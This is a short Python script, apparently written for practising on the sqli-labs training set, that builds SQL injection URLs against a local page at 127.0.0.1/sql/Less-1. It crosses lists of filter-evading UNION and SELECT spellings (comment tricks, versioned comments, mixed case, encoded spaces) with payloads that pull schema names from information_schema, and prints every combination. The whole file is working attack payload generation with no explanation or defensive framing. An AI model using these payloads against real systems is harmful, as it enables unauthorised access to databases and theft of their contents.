a = ['union%20','UninON%20','/*union%20*/','/*!50000uNIon*/','/*!50000union*/','/*union%20*/','union/*!/**/',
     'union -- 1%0a%20','+union+','union -- hex()%0a','UNIunionON','+uniOn+distInctRoW+','*9e0unIon']
b = ['select%20','seLect%20','select/*", 2 AS "*/%20']
c = ['1,group_concat(schema_name),3 from information_schema.schemata--+','~1,group_concat(schema_name),~3 from information_schema.schemata--+',
     '1,group_concat(schema_name),3 from `information_schema`.`schemata`--+','~1,group_concat(schema_name),~3 from `information_schema`.`schemata`--+',
     '1,group_concat(schema_name),3e0from `information_schema`.`schemata`--+','*FrOm(SeLeCt 1)a JOIN (SeLeCt 2)b JOIN (SeLeCt database())c--+']
fuzzingurl ="http://127.0.0.1/sql/Less-1/?id=1'%20"      #url需要加上闭合符和空格
for x in a:
  for y in b:
      for z in c:
        exp = ((fuzzingurl)+(x+y+z))
        print(exp)        #这是基于union select的，且只有3个字段




